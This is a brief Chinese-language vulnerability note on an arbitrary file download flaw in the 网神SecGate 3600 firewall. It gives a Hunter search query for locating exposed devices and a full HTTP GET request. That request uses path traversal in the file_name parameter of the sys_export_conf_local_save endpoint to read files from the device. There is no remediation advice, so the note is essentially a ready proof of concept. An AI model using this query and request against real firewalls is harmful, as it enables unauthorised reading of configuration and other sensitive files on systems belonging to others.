# 网神SecGata 3600防火墙存在任意文件下载漏洞

# 一、漏洞简介
网神SecGata 3600防火墙存在任意文件下载漏洞

# 二、影响版本
+ 网神SecGata 3600防火墙

# 三、资产测绘
+ hunter`app.name="网神 SecGate"`
+ 特征

![1699025464055-779b228f-776a-4779-bd37-dc1169b22d30.png](./img/BZE6j-rjWFII193w/1699025464055-779b228f-776a-4779-bd37-dc1169b22d30-146282.png)

# 四、漏洞复现
```plain
GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1
Host: xx.xx.xx.xx
Cookie: __s_sessionid__=5543sd9rcbiklqs1ttignkqvt6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1699025619992-0db92bcd-d757-4eee-9ef5-2c1ca8153978.png](./img/BZE6j-rjWFII193w/1699025619992-0db92bcd-d757-4eee-9ef5-2c1ca8153978-977623.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bql4k8u8x1l3ar5t>